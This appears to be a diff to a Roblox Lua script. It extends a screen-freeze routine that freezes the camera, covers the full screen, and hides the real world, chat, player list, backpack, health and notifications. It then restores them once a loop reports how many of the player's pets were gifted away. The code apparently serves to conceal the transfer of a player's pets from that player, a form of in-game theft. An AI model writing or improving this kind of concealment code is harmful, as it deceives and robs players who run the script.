@@ -75,6 +75,7 @@ end
 
 -- State
 local isRunning = false
+local freezeConnectionStorage = {}
 
 -- Utility Functions
 local function Log(message)
@@ -101,10 +102,11 @@ local function FreezeScreen()
     local frozenCFrame = camera.CFrame
     local cameraConnection
     
-    -- Create ScreenGui with highest display order
+    -- Create ScreenGui with highest display order and full screen coverage
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "ScreenFreeze"
     screenGui.DisplayOrder = 999999999
+    screenGui.IgnoreGuiInset = true  -- Cover entire screen including topbar/chat
     screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
     
     -- White flash transition (longer)
@@ -156,8 +158,9 @@ local function FreezeScreen()
         camera.CFrame = frozenCFrame
     end)
     
-    -- Store camera connection for later cleanup
-    screenGui:SetAttribute("CameraConnection", cameraConnection)
+    -- Store camera connection reference globally
+    freezeConnectionStorage.cameraConnection = cameraConnection
+    screenGui:SetAttribute("HasCameraConnection", true)
     
     -- Hide the real world
     pcall(function()
@@ -166,6 +169,17 @@ local function FreezeScreen()
                 obj.Parent = game:GetService("Lighting")
             end
         end
+    end)
+    
+    -- Hide CoreGui (Chat, TopBar, etc.)
+    pcall(function()
+        local StarterGui = game:GetService("StarterGui")
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) 
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+        screenGui:SetAttribute("CoreGuiDisabled", true)
+        Log("🔇 CoreGui hidden")
     end)
     
     -- Hide all ingame notifications
@@ -244,10 +258,20 @@ local function UnfreezeScreen()
         -- Disconnect camera freeze first
         local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
         if screenGui then
-            local cameraConnection = screenGui:GetAttribute("CameraConnection")
-            if cameraConnection then
-                cameraConnection:Disconnect()
+            if screenGui:GetAttribute("HasCameraConnection") and freezeConnectionStorage.cameraConnection then
+                freezeConnectionStorage.cameraConnection:Disconnect()
+                freezeConnectionStorage.cameraConnection = nil
                 Log("📷 Camera unfrozen")
+            end
+            
+            -- Restore CoreGui
+            if screenGui:GetAttribute("CoreGuiDisabled") then
+                local StarterGui = game:GetService("StarterGui")
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true)
+                Log("🔔 CoreGui restored")
             end
             
             -- Restore notifications
@@ -1006,7 +1030,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
-    --UnfreezeScreen()
+    UnfreezeScreen()
     isRunning = false
 end
 
